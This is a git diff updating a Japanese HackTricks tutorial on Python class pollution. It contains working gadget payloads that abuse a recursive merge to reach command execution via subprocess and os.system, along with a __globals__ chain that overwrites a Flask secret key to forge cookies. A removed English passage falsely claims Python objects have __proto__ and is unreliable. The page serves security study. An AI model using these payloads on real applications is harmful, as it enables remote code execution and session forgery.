@@ -1,20 +1,22 @@
-# クラスの汚染（Pythonのプロトタイプ汚染）
+# クラス汚染 (Pythonのプロトタイプ汚染)
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法:
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。
 
 </details>
 
 ## 基本的な例
 
-文字列でオブジェクトのクラスを汚染する方法を確認してください：
+オブジェクトのクラスを文字列で汚染する方法を確認してください：
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -39,38 +41,6 @@ print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
 ## 基本的な脆弱性の例
-
-Consider the following Python code:
-
-```python
-class Person:
-    def __init__(self, name):
-        self.name = name
-
-    def greet(self):
-        print(f"Hello, my name is {self.name}.")
-
-person = Person("Alice")
-person.greet()
-```
-
-This code defines a `Person` class with an `__init__` method that initializes the `name` attribute, and a `greet` method that prints a greeting message with the person's name.
-
-Now, let's say an attacker can control the input to the `name` parameter. They could potentially exploit a vulnerability known as **prototype pollution** to modify the behavior of the `Person` class.
-
-Prototype pollution occurs when an attacker can inject properties or methods into an object's prototype, leading to unexpected behavior or even remote code execution.
-
-In this case, the attacker could pass a specially crafted `name` value that modifies the `Person` class prototype. For example:
-
-```python
-person = Person("__proto__")
-person.__proto__.greet = lambda: print("Hello, I'm a hacker!")
-person.greet()
-```
-
-By setting the `greet` method of the `__proto__` object to a malicious function, the attacker has effectively changed the behavior of all `Person` instances. Now, when `person.greet()` is called, it will print the attacker's message instead of the original greeting.
-
-This is just a basic example to illustrate the concept of prototype pollution. In real-world scenarios, prototype pollution can be much more complex and dangerous, allowing attackers to bypass security measures and gain unauthorized access to sensitive data or execute arbitrary code. It is important for developers to be aware of this vulnerability and implement proper input validation and sanitization to prevent such attacks.
 ```python
 # Initial state
 class Employee: pass
@@ -103,11 +73,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## ガジェットの例
+## ガジェット例
 
 <details>
 
-<summary>クラスプロパティのデフォルト値をRCE（サブプロセス）にする方法</summary>
+<summary>クラスプロパティのデフォルト値をRCE（subprocess）にする</summary>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -158,7 +128,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary><code>globals</code>を介して他のクラスとグローバル変数を汚染する</summary>
+<summary>他のクラスやグローバル変数を<code>globals</code>を通じて汚染する</summary>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -190,7 +160,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>任意のサブプロセスの実行</summary>
+<summary>任意のサブプロセス実行</summary>
 ```python
 import subprocess, json
 
@@ -222,9 +192,10 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>__kwdefaults__の上書き</summary>
+<summary><strong><code>__kwdefaults__</code></strong>の上書き</summary>
 
-**`__kwdefaults__`**は、すべての関数の特別な属性です。Pythonの[ドキュメント](https://docs.python.org/3/library/inspect.html)によると、「キーワード専用パラメータのデフォルト値のマッピング」です。この属性を汚染することで、関数のキーワード専用パラメータのデフォルト値を制御することができます。これらは、関数の\*または\*argsの後に来るパラメータです。
+**`__kwdefaults__`** は全ての関数の特別な属性で、Pythonの[ドキュメント](https://docs.python.org/3/library/inspect.html)によると、これは「**キーワード専用**パラメータのデフォルト値のマッピング」です。この属性を汚染することで、関数のキーワード専用パラメータのデフォルト値を制御できます。これらは、関数のパラメータで\*または\*argsの後に来るものです。
+</details>
 ```python
 from os import system
 import json
@@ -265,16 +236,17 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Flaskのシークレットキーをファイル間で上書きする</summary>
+<summary>Flaskシークレットをファイル間で上書きする</summary>
 
-したがって、WebのメインのPythonファイルで定義されているが、そのクラスがメインのファイルとは異なるファイルで定義されているオブジェクトに対してクラスの汚染を行うことができます。前のペイロードで\_\_globals\_\_にアクセスするためには、オブジェクトのクラスまたはクラスのメソッドにアクセスする必要があります。そのため、そのファイルのグローバル変数にはアクセスできますが、メインのファイルではアクセスできません。したがって、メインページでシークレットキーを定義したFlaskアプリのグローバルオブジェクトにはアクセスできません。
+したがって、メインのPythonファイルで定義されたオブジェクトに対してクラス汚染を行い、**そのクラスがメインファイルとは異なるファイルで定義されている場合**、前述のペイロードで\_\_globals\_\_にアクセスするにはそのオブジェクトのクラスやクラスのメソッドにアクセスする必要があります。そのため、**そのファイルのグローバル変数にはアクセスできますが、メインファイルのものにはアクセスできません**。\
+従って、メインページで**シークレットキー**を定義した**Flaskアプリのグローバルオブジェクトにはアクセスできない**でしょう：
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-このシナリオでは、メインファイルにアクセスするためにファイルをトラバースするガジェットが必要です。これにより、Flaskのシークレットキーを変更し、このキーを知ることで特権を昇格させることができます（[詳細はこちら](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)）。
+このシナリオでは、ファイルをトラバースしてメインのファイルに到達し、**グローバルオブジェクト `app.secret_key` に**アクセスしてFlaskのシークレットキーを変更し、このキーを知ることで[**権限昇格**を行うことができます](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)。
 
-このようなペイロードは、[この解説記事](https://ctftime.org/writeup/36082)から取得できます：
+以下のようなペイロードが[このライトアップから](https://ctftime.org/writeup/36082)参照できます：
 
 {% code overflow="wrap" %}
 ```python
@@ -282,11 +254,11 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 ```
 {% endcode %}
 
-このペイロードを使用して、`app.secret_key`（アプリ内の名前は異なる場合があります）を変更し、新しい特権を持つflaskクッキーに署名できるようにします。
+このペイロードを使用して、新しい権限を持つflaskクッキーを署名できるように**`app.secret_key`を変更します**（アプリ内の名前は異なる場合があります）。
 
 </details>
 
-さらに、次のページも参照してください。
+読み取り専用ガジェットについては、以下のページも確認してください：
 
 {% content-ref url="python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](python-internal-read-gadgets.md)
@@ -298,12 +270,14 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェックしてください！</strong></summary>
 
-* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
-* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私を**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **および** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
+HackTricksをサポートする他の方法：
+
+* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか**、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローしてください。**
+* **ハッキングのトリックを共有するために、** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出してください。
 
 </details>
